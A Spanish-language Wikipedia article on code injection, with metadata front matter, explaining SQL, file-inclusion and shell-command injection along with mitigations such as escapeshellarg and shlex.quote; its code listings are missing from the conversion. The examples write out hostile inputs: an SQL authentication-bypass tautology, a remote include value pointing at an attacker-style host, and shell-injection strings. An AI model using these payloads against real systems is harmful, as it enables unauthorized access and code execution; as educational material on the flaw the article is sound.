---
type: Artículo de enciclopedia
title: Inyección de código
description: Un defecto de inyección de código ocurre cuando es posible enviar datos inesperados a un intérprete.
resource: https://es.wikipedia.org/wiki/Inyección_de_código
tags: [seguridad, wikipedia]
sources:
  - {"id": "eswiki", "title": "Wikipedia (es) 2026-11-01", "author": "community:wikipedia-es", "last_modified": "2026-11-01T00:00:00Z", "resource": "https://es.wikipedia.org/wiki/Inyección_de_código"}
license: CC BY-SA 4.0
id: eswiki-Inyección_de_código
generated: {"by": "alejandria/2026.11.27", "at": "2026-11-27T17:14:52Z"}
status: stable
stale_after: 2027-11-27T17:14:52Z
---

# Inyección de código

Un defecto de **inyección de código** ocurre cuando es posible enviar datos inesperados a un intérprete. Estos son muy comunes en código antiguo. Se encuentran frecuentemente en consultas SQL, LDAP, Xpath o NoSQL; comandos de sistema operativo; analizadores sintácticos de XML; cabeceras SMTP; parámetros de funciones; etc. Estos defectos son fáciles de encontrar cuando se examina el código, sin embargo son difíciles de descubrir mediante pruebas funcionales. Existen utilidades de escaneo que pueden ayudar a encontrar estos defectos.

Una inyección de código puede resultar en la pérdida o corrupción de datos, falta de responsabilidad en acciones o denegación de acceso. Una inyección puede incluso tomar control total de un nodo.

Algunos tipos de inyección de código son errores de interpretación, dando un significado especial a una introducción de datos por parte del usuario. Existen errores de interpretación similares fuera del mundo de la computación, cuando, por ejemplo, es difícil distinguir adecuadamente un nombre propio de un nombre común. De la misma forma, en algunos tipos de inyección de código puede haber un problema para diferenciar los parámetros introducidos por el usuario de los comandos del sistema.

Las técnicas de inyección de código son populares en el *hacking* y *cracking* para conseguir acceder a información restringida, para aumentar los privilegios o para conseguir acceder a sistemas restringidos. Este tipo de ataques pueden ser usados con objetivos malintencionados para muchas cosas, incluyendo:
 Modificar valores arbitrariamente en una base de datos mediante inyección de SQL. El impacto de esta acción puede ir desde cambios en la apariencia de una página web hasta comprometer datos sensibles.
 Instalar *malware* o ejecutar código malintencionado en un servidor mediante la inyección de código de *scripting* (como PHP o ASP).
 Aumentar los privilegios como superusuario utilizando vulnerabilidades del sistema operativo.
 Atacando usuarios de páginas web con inyecciones de código HTML o *scripts*.

 Ejemplos de inyección de código

 Inyección de SQL
Una inyección de código SQL se aprovecha de la sintaxis en este lenguaje para introducir comandos de manera ilícita que permitan leer o modificar la base de datos, comprometiendo el contenido de la consulta original.

Por ejemplo, considerando una página web que tiene dos campos para permitir a los usuarios introducir su nombre y contraseña, el código detrás generará una consulta SQL para verificar dichos credenciales contra la lista guardada en la base de datos:

Si esta consulta devuelve alguna fila entonces se permite el acceso. Sin embargo, si un usuario malintencionado introduce un *NombreUsuario* válido e inyecta código SQL como "Contraseña' OR '1'='1" en el campo Contraseña, entonces la consulta quedaría de esta forma:

En el ejemplo anterior, la condición para validar la "Contraseña" está alterada y siempre se devolverán valores, permitiendo de esta forma el acceso de manera ilícita.

 Inyección de fichero
Considerando el siguiente código PHP en una página web, el cual especifica un fichero en la petición:

Este código espera leer ficheros del tipo *azul.php* o *rojo.php*, sin embargo alguien podría introducir $color=http://malvado.com/fichero_malintencionado forzando al código a leer el fichero php especificado.

 Inyección de instrucciones
La inyección de instrucciones (o inyección de intérprete de órdenes) fue llamado así por las Shell de Unix, pero se aplica a la mayoría de sistemas que permitan a las aplicaciones ejecutar un intérprete de órdenes.

Aquí hay un ejemplo de un script tcsh vulnerable:

Si el script anterior se guarda como el archivo ejecutable ./comprobacion, la instrucción ./comprobación " 1 ) diabolico" intentará ejecutar la instrucción diabolico inyectada al código en lugar de comparar el argumento con el valor uno.

Cualquier función que pueda ser usada para componer y ejecutar una instrucción de shell es un posible vehículo de un ataque de inyección de intérprete de órdenes. Entre otras funciones tenemos system, StartProcess y System.Diagnostics.Process.Start.

Cualquier sistema Cliente-servidor como un navegador web que interactúa con un servidor web puede ser vulnerable a inyección de intérprete de órdenes. Considere el siguiente código PHP que se puede ejecutar en un servidor web para ejecutar un programa externo llamado textodivertido para reemplazar una palabra que el usuario ha enviado con alguna otra palabra:

La instrucción passthru en el código anterior expone una instrucción de la shell que es ejecutada por el servidor web. Como parte de la instrucción está compuesta por la URL proporcionada por el navegador, se puede inyectar código malicioso en ella. Basta con inyectar código a ese programa de diversas maneras, como https://.../script.php?%3B%20diabolico;, que ejecutará la instrucción textodivertido sin parámetros y posteriormente la instrucción diabolico inyectada al código.

Algunos lenguajes de programación ofrecen funciones para escapar correctamente los parámetros usados para construir parámetros de las instrucciones de la línea de instrucciones:
 PHP: escapeshellarg y escapeshellcmd
 Python: shlex.quote
Aun así aún se impone a los programadores la responsabilidad de conocer/aprender estas funciones y recordar hacer uso de ellas cada vez que utilicen comandos de shell. Además de utilizar estas funciones, también se recomienda validar o filtrar la entrada del usuario.

Una alternativa más segura es utilizar APIs que ejecuten programas externos directamente, en lugar de a través de una shell, evitando así la posibilidad de inyección de shell. Sin embargo, estas APIs tienden a no admitir varias características que proporcionan las shells y/o a ser más engorrosas/detalladas en comparación con la sintaxis de shell.

 Referencias
